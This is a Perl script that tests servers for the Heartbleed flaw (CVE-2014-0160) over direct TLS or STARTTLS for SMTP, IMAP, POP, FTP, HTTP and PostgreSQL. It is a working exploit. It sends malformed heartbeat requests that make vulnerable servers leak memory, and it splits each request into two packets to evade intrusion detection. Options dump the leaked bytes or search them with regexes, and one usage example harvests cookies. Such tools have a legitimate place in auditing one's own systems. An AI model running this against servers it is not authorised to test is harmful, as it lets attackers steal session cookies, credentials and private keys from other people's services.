#!/usr/bin/perl
# Copyright: Steffen Ullrich 2014
# feel free to use, copy, modify without restrictions - NO WARRANTY

use strict;
use warnings;
use Getopt::Long qw(:config posix_default bundling);

# try to use IPv6
my $INETCLASS;
BEGIN {
    my @mod = qw(IO::Socket::IP IO::Socket::INET6 IO::Socket::INET);
    while ($INETCLASS = shift @mod) {
	last if eval "require $INETCLASS";
	die "failed to load $INETCLASS: $@" if ! @mod;
    }
}

my $starttls = sub {1};
my $starttls_arg;
my $timeout = 5;
my $quiet = 0;
my $show = 0;
my $show_ascii = 0;
my $ssl_version = 'auto';
my @show_regex;
my $heartbeats = 1;
my $show_cert;
my $sni_hostname;
my %starttls = (
    'smtp' => [ 25, \&smtp_starttls ],
    'http_proxy' => [ 8000, \&http_connect ],
    'http_upgrade' => [ 80, \&http_upgrade ],
    'imap' => [ 143, \&imap_starttls ],
    'pop'  => [ 110, \&pop_stls ],
    'ftp'  => [ 21, \&ftp_auth ],
    'postgresql'  => [ 5432, \&postgresql_init ],
);

sub usage {
    print STDERR "ERROR: @_\n" if @_;
    print STDERR <<USAGE;

Check if server is vulnerable against heartbleed SSL attack (CVE-2014-0160)
Features:
- can start with plain and upgrade with STARTTLS or similar commands with
  IMAP, POP, SMTP, FTP, HTTP and HTTP proxies, PostgreSQL
- heartbeat request is sent in two packets to circumvent simple packet
  matching IDS or packet filters
- handshake is done with TLS1.0 for better compatibility, heartbeat uses
  SSL version from server
- can use regular expressions to directly extract information from
  vulnerable sites
- can use IPv6

Usage: $0 [ --starttls proto[:arg] ] [ --timeout T ] host:port
  -h|--help                - this screen
  --starttls proto[:arg]   - start plain and upgrade to SSL with starttls protocol
			     (imap,smtp,http_upgrade,http_connect,pop,ftp,postgresql)
  -q|--quiet               - don't show anything, exit 1 if vulnerable
  -c|--show-cert           - show some information about certificate
  -s|--show-data [L]       - show heartbeat response if vulnerable, optional
			     parameter L specifies number of bytes per line (16)
  -a|--show-ascii [L]      - show heartbeat response ascii only if vulnerable, optional
			     parameter L specifies number of bytes per line (80)
  -R|--show-regex-match R  - show data matching perl regex R. Option can be
			     used multiple times
  --ssl_version V          - specify SSL version to use, e.g. ssl3, tlsv1,
			     tlsv1_1, tlsv1_2 or auto (default), which tries
			     until it gets a server hello back
  --sni-hostname H         - specifiy hostname for SNI, set to '' to disable SNI
			     will try with target host of not given
  -H|--heartbeats N        - number of heartbeats (default 1)
  -T|--timeout T           - use timeout (default 5)

Examples:
  # check direct www, imaps .. server
  $0 www.google.com:443
  $0 www.google.com:https
  $0 mail.google.com:imaps

  # try to get Cookies
  $0 -R 'Cookie:.*' www.broken-site.com:443

  # check webserver via proxy
  $0 --starttls http_connect:www.google.com:443 proxy:8000

  # check webserver with http upgrade (OPTIONS *...)
  $0 --starttls http_upgrade 127.0.0.1:631

  # check webserver with http upgrade (GET /..)
  $0 --starttls http_upgrade:get=/ 127.0.0.1:631

  # check imap server, start with plain and upgrade
  $0 --starttls imap imap.gmx.net:143

  # check pop server, start with plain and upgrade
  $0 --starttls pop pop.gmx.net:110

  # check smtp server, start with plain and upgrade
  $0 --starttls smtp smtp.gmail.com:587


USAGE
    exit(2);
}

my $default_port = 443;
GetOptions(
    'h|help' => sub { usage() },
    'T|timeout=i' => \$timeout,
    's|show-data:i' => sub { $show = $_[1] || 16 },
    'a|show-ascii:i' => sub { $show_ascii = $_[1] || 80 },
    'R|show-regex-match:s' => \@show_regex,
    'c|show-cert' => \$show_cert,
    'q|quiet' => \$quiet,
    'sni-hostname:s' => \$sni_hostname,
    'H|heartbeats=i' => \$heartbeats,
    'starttls=s' => sub {
	(my $proto,$starttls_arg) = $_[1] =~m{^(\w+)(?::(.*))?$};
	my $st = $proto && $starttls{$proto};
	usage("invalid starttls protocol $_[1]") if ! $st;
	($default_port,$starttls) = @$st;
    },
    'ssl_version=s' => \$ssl_version,
);

# use Net::SSLeay to print certificate information
die "need Net::SSLeay to show certificate information"
    if $show_cert && ! eval { require Net::SSLeay };

# try to do show_cert by default if not quiet, but don't complain if we
# cannot do it because we have no Net::SSLeay
$show_cert ||= ! $quiet && eval { require Net::SSLeay };

$ssl_version =
    lc($ssl_version) eq 'ssl3' ? 0x0300 :
    $ssl_version =~ m{^tlsv?1(?:_([12]))?}i ? 0x0301 + ($1||0) :
    0; # try possible versions

my $show_regex;
if (@show_regex) {
    my @rx;
    push @rx, eval { qr{$_} } || die "invalid perl regex '$_'"
	for(@show_regex);
    $show_regex = join('|',@rx);
    $show_regex = eval { qr{$show_regex} } || die "invalid regex: $show_regex";
}

my $dst = shift(@ARGV) or usage("no destination given");
$dst .= ":$default_port" if $dst !~ m{^([^:]+|.+\]):\w+$};
( my $hostname = $dst ) =~s{:\w+$}{};
$hostname = $1 if $hostname =~m{^\[(.*)\]$};

if ( ! defined $sni_hostname ) {
    $sni_hostname = $hostname;
    $sni_hostname = '' if $sni_hostname =~m{:|^[\d\.]+$};  # IP6/IP4
}

my $connect = sub {
    my ($ssl_version,$sni,$ciphers) = @_;

    my $cl = $INETCLASS->new(
	ref($dst) ? ( PeerAddr => $dst->[0], PeerPort => $dst->[1] )
	    : ( PeerAddr => $dst ),
	Timeout => $timeout
    ) or die "failed to connect: $!";
    # save dst to not resolve name every connect attempt
    $dst = [ $cl->peerhost, $cl->peerport ] if ! ref($dst);

    # disable NAGLE to send heartbeat with multiple small packets
    setsockopt($cl,6,1,pack("l",1));
    # skip plaintext before starting SSL handshake
    $starttls->($cl,$hostname);

    # extensions
    my $ext = '';
    if ( defined $sni and $sni ne '' ) {
	$ext .= pack('nn/a*', 0x00,   # server_name extension + length
	    pack('n/a*',              # server_name list length
		pack('Cn/a*',0,$sni)  # type host_name(0) + length/server_name
	));
    }

    # built and send ssl client hello
    my $hello_data = pack("nNn14Cn/a*C/a*n/a*",
	$ssl_version,
	time(),
	( map { rand(0x10000) } (1..14)),
	0, # session-id length
	pack("C*",@$ciphers),
	"\0", # compression null
	$ext,
    );

    $hello_data = substr(pack("N/a*",$hello_data),1); # 3byte length
    print $cl pack(
	"Cnn/a*",0x16,$ssl_version,  # type handshake, version, length
	pack("Ca*",1,$hello_data),   # type client hello, data
    );

    my $use_version;
    my $got_server_hello;
    my $err;
    while (1) {
	my ($type,$ver,@msg) = _readframe($cl,\$err) or return;

	# first message must be server hello
	$got_server_hello ||= $type == 22 and grep { $_->[0] == 2 } @msg;
	return if ! $got_server_hello;

	# wait for server hello done
	if ( $type == 22 and grep { $_->[0] == 0x0e } @msg ) {
	    # server hello done
	    $use_version = $ver;
	    last;
	}
    }

    return ($cl,$use_version);
};

# these are the ciphers we try
# that's all openssl -V ciphers reports with my openssl1.0.1
my @ssl3_ciphers = (
    0xC0,0x14,  0xC0,0x0A,  0xC0,0x22,  0xC0,0x21,  0x00,0x39,  0x00,0x38,
    0x00,0x88,  0x00,0x87,  0xC0,0x0F,  0xC0,0x05,  0x00,0x35,  0x00,0x84,
    0x00,0x8D,  0xC0,0x12,  0xC0,0x08,  0xC0,0x1C,  0xC0,0x1B,  0x00,0x16,
    0x00,0x13,  0xC0,0x0D,  0xC0,0x03,  0x00,0x0A,  0x00,0x8B,  0xC0,0x13,
    0xC0,0x09,  0xC0,0x1F,  0xC0,0x1E,  0x00,0x33,  0x00,0x32,  0x00,0x9A,
    0x00,0x99,  0x00,0x45,  0x00,0x44,  0xC0,0x0E,  0xC0,0x04,  0x00,0x2F,
    0x00,0x96,  0x00,0x41,  0x00,0x8C,  0xC0,0x11,  0xC0,0x07,  0xC0,0x0C,
    0xC0,0x02,  0x00,0x05,  0x00,0x04,  0x00,0x8A,  0x00,0x15,  0x00,0x12,
    0x00,0x09,  0x00,0x14,  0x00,0x11,  0x00,0x08,  0x00,0x06,  0x00,0x03,
);
my @tls12_ciphers = (
    0xC0,0x30,  0xC0,0x2C,  0xC0,0x28,  0xC0,0x24,  0x00,0xA3,  0x00,0x9F,
    0x00,0x6B,  0x00,0x6A,  0xC0,0x32,  0xC0,0x2E,  0xC0,0x2A,  0xC0,0x26,
    0x00,0x9D,  0x00,0x3D,  0xC0,0x2F,  0xC0,0x2B,  0xC0,0x27,  0xC0,0x23,
    0x00,0xA2,  0x00,0x9E,  0x00,0x67,  0x00,0x40,  0xC0,0x31,  0xC0,0x2D,
    0xC0,0x29,  0xC0,0x25,  0x00,0x9C,  0x00,0x3C,
);


# try to connect and do ssl handshake either with the specified version or with
# different versions (downgrade). Some servers just close if you start with
# TLSv1.2 instead of replying with a lesser version
my ($cl,$use_version);
for my $ver ( $ssl_version ? $ssl_version : ( 0x303, 0x302, 0x301, 0x300 )) {
    my @ciphers = (( $ver == 0x303 ? @tls12_ciphers : ()), @ssl3_ciphers );
    if ( $sni_hostname ) {
	verbose("...try to connect with version 0x%x with SNI",$ver);
	($cl,$use_version) = $connect->( $ver, $sni_hostname, \@ciphers ) and last;
    }
    verbose("...try to connect with version 0x%x w/o SNI",$ver);
    ($cl,$use_version) = $connect->( $ver, $sni_hostname, \@ciphers ) and last;
}

# TODO: if everything fails we might have a F5 in front which cannot deal
# with large client hellos.
die "Failed to make a successful TLS handshake with peer.\n".
    "Either peer does not talk SSL or sits behind some stupid SSL middlebox."
    if ! $cl;

# heartbeat request with wrong size
# send in two packets to work around stupid IDS which try
# to detect attack by matching packets only
my $hb = pack("Cnn/a*",0x18,$use_version,
    pack("Cn",1,0x4000));

for (1..$heartbeats) {
    verbose("...send heartbeat#$_");
    print $cl substr($hb,0,1);
    print $cl substr($hb,1);
}

my $err;
if ( my ($type,$ver,$buf) = _readframe($cl,\$err,1)) {
    if ( $type == 21 ) {
	verbose("received alert (probably not vulnerable)");
    } elsif ( $type != 24 ) {
	verbose("unexpected reply type $type");
    } elsif ( length($buf)>3 ) {
	verbose("BAD! got ".length($buf)." bytes back instead of 3 (vulnerable)");
	show_data($buf,$show) if $show;
	show_ascii($buf,$show_ascii) if $show_ascii;
	if ( $show_regex ) {
	    while ( $buf =~m{($show_regex)}g ) {
		print STDERR $1."\n";
	    }
	}
	exit 1;
    } else {
	verbose("GOOD proper heartbeat reply (not vulnerable)");
    }
} else {
    verbose("no reply($err) - probably not vulnerable");
}

sub _readframe {
    my ($cl,$rerr,$errok) = @_;
    my $len = 5;
    my $buf = '';
    vec( my $rin = '',fileno($cl),1 ) = 1;
    while ( length($buf)<$len ) {
	if ( ! select( my $rout = $rin,undef,undef,$timeout )) {
	    $$rerr = 'timeout';
	    last if $errok;
	    return;
	};
	if ( ! sysread($cl,$buf,$len-length($buf),length($buf))) {
	    $$rerr = "eof";
	    $$rerr .= " after ".length($buf)." bytes" if $buf ne '';
	    last if $errok;
	    return;
	}
	$len = unpack("x3n",$buf) + 5 if length($buf) == 5;
    }
    return if length($buf)<5;
    (my $type, my $ver) = unpack("Cnn",substr($buf,0,5,''));
    my @msg;
    if ( $type == 22 ) {
	while ( length($buf)>=4 ) {
	    my ($ht,$len) = unpack("Ca3",substr($buf,0,4,''));
	    $len = unpack("N","\0$len");
	    push @msg,[ $ht,substr($buf,0,$len,'') ];
	    verbose("...ssl received type=%d ver=0x%x ht=0x%x size=%d",
		$type,$ver,$ht,length($msg[-1][1]));
	    if ( $show_cert && $ht == 11 ) {
		my $clen = unpack("N","\0".substr($msg[-1][1],0,3));
		my $certs = substr($msg[-1][1],3,$clen);
		my $i = 0;
		while ($certs ne '') {
		    my $clen = unpack("N","\0".substr($certs,0,3,''));
		    my $cert = substr($certs,0,$clen,'');
		    length($cert) == $clen or
			die "invalid certificate length ($clen vs. ".length($cert).")";
		    printf "[%d] %s\n",$i, cert2line($cert);
		    $i++;
		}
	    }
	}
    } else {
	@msg = $buf;
	verbose("...ssl received type=%d ver=%x size=%d",
	    $type,$ver,length($buf));
    }

    return ($type,$ver,@msg);
}

sub smtp_starttls {
    my $cl = shift;
    my $last_status_line = qr/((\d)\d\d(?:\s.*)?)/;
    my ($line,$code) = _readlines($cl,$last_status_line);
    $code == 2 or die "server denies access: $line\n";
    print $cl "EHLO example.com\r\n";
    ($line,$code) = _readlines($cl,$last_status_line);
    $code == 2 or die "server did not accept EHLO: $line\n";
    print $cl "STARTTLS\r\n";
    ($line,$code) = _readlines($cl,$last_status_line);
    $code == 2 or die "server did not accept STARTTLS: $line\n";
    verbose("...reply to starttls: $line");
    return 1;
}

sub imap_starttls {
    my $cl = shift;
    <$cl>; # welcome
    print $cl "abc STARTTLS\r\n";
    while (<$cl>) {
	m{^abc (OK)?} or next;
	$1 or die "STARTTLS failed: $_";
	s{\r?\n$}{};
	verbose("...starttls: $_");
	return 1;
    }
    die "starttls failed";
}

sub pop_stls {
    my $cl = shift;
    <$cl>; # welcome
    print $cl "STLS\r\n";
    my $reply = <$cl>;
    die "STLS failed: $reply" if $reply !~m{^\+OK};
    $reply =~s{\r?\n}{};
    verbose("...stls $reply");
    return 1;
}

sub http_connect {
    my $cl = shift;
    $starttls_arg or die "no target host:port given";
    print $cl "CONNECT $starttls_arg HTTP/1.0\r\n\r\n";
    my $hdr = _readlines($cl,qr/\r?\n/);
    $hdr =~m{\A(HTTP/1\.[01]\s+(\d\d\d)[^\r\n]*)};
    die "CONNECT failed: $1" if $2 != 200;
    verbose("...connect request: $1");
    return 1;
}

sub http_upgrade {
    my ($cl,$hostname) = @_;
    my $rq;
    if ( $starttls_arg && $starttls_arg =~m{^get(?:=(\S+))?}i ) {
	my $path = $1 || '/';
	$rq = "GET $path HTTP/1.1\r\n".
	    "Host: $hostname\r\n".
	    "Upgrade: TLS/1.0\r\n".
	    "Connection: Upgrade\r\n".
	    "\r\n";
    } else {
	my $path = $starttls_arg && $starttls_arg =~m{^options=(\S+)}i
	    ? $1:'*';
	$rq = "OPTIONS $path HTTP/1.1\r\n".
	    "Host: $hostname\r\n".
	    "Upgrade: TLS/1.0\r\n".
	    "Connection: Upgrade\r\n".
	    "\r\n";
    }
    print $cl $rq;
    my $hdr = _readlines($cl,qr/\r?\n/);
    $hdr =~m{\A(HTTP/1\.[01]\s+(\d\d\d)[^\r\n]*)};
    die "upgrade not accepted, code=$2 (expect 101): $1" if $2 != 101;
    verbose("...tls upgrade request: $1");
    return 1;
}

sub ftp_auth {
    my $cl = shift;
    my $last_status_line = qr/((\d)\d\d(?:\s.*)?)/;
    my ($line,$code) = _readlines($cl,$last_status_line);
    die "server denies access: $line\n" if $code != 2;
    print $cl "AUTH TLS\r\n";
    ($line,$code) = _readlines($cl,$last_status_line);
    die "AUTH TLS denied: $line\n" if $code != 2;
    verbose("...ftp auth: $line");
    return 1;
}

sub postgresql_init {
    my $cl = shift;
    # magic header to initiate SSL:
    # http://www.postgresql.org/docs/devel/static/protocol-message-formats.html
    print $cl pack("NN",8,80877103);
    read($cl, my $buf,1 ) or die "did not get response from postgresql";
    $buf eq 'S' or die "postgresql does not support SSL (response=$buf)";
    verbose("...postgresql supports SSL: $buf");
    return 1;
}

sub verbose {
    return if $quiet;
    my $msg = shift;
    $msg = sprintf($msg,@_) if @_;
    print STDERR $msg,"\n";
}

sub show_data {
    my ($data,$len) = @_;
    my $lastd = '';
    my $repeat = 0;
    while ( $data ne '' ) {
	my $d = substr($data,0,$len,'' );
	$repeat++,next if $d eq $lastd;
	$lastd = $d;
	if ( $repeat ) {
	    print STDERR "... repeated $repeat times ...\n";
	    $repeat = 0;
	}
	( my $h = unpack("H*",$d)) =~s{(..)}{$1 }g;
	( my $c = $d ) =~s{[\x00-\x20\x7f-\xff]}{.}g;
	my $hl = $len*3;
	printf STDERR "%-${hl}s  %-${len}s\n",$h,$c;
    }
    print STDERR "... repeated $repeat times ...\n" if $repeat;
}

sub show_ascii {
    my ($data,$len) = @_;
    my $lastd = '';
    my $repeat = 0;
    while ( $data ne '' ) {
	my $d = substr($data,0,$len,'' );
	$repeat++,next if $d eq $lastd;
	$lastd = $d;
	if ( $repeat ) {
	    print STDERR "... repeated $repeat times ...\n";
	    $repeat = 0;
	}
	( my $c = $d ) =~s{[\x00-\x20\x7f-\xff]}{.}g;
	printf STDERR "%-${len}s\n",$c;
    }
    print STDERR "... repeated $repeat times ...\n" if $repeat;
}

sub cert2line {
    my $der = shift;
    my $bio = Net::SSLeay::BIO_new( Net::SSLeay::BIO_s_mem());
    Net::SSLeay::BIO_write($bio,$der);
    my $cert = Net::SSLeay::d2i_X509_bio($bio);
    Net::SSLeay::BIO_free($bio);
    $cert or die "cannot parse certificate: ".
	Net::SSLeay::ERR_error_string(Net::SSLeay::ERR_get_error());
    my $not_before = Net::SSLeay::X509_get_notBefore($cert);
    my $not_after = Net::SSLeay::X509_get_notAfter($cert);
    $_ = Net::SSLeay::P_ASN1_TIME_put2string($_) for($not_before,$not_after);
    my $subject = Net::SSLeay::X509_NAME_oneline(
	Net::SSLeay::X509_get_subject_name($cert));
    return "$subject | $not_before - $not_after";
}

sub _readlines {
    my ($cl,$stoprx) = @_;
    my $buf = '';
    while (<$cl>) {
	$buf .= $_;
	return $buf if ! $stoprx;
	next if ! m{\A$stoprx\Z};
	return ( m{\A$stoprx\Z},$buf );
    }
    die "eof" if $buf eq '';
    die "unexpected response: $buf";
}
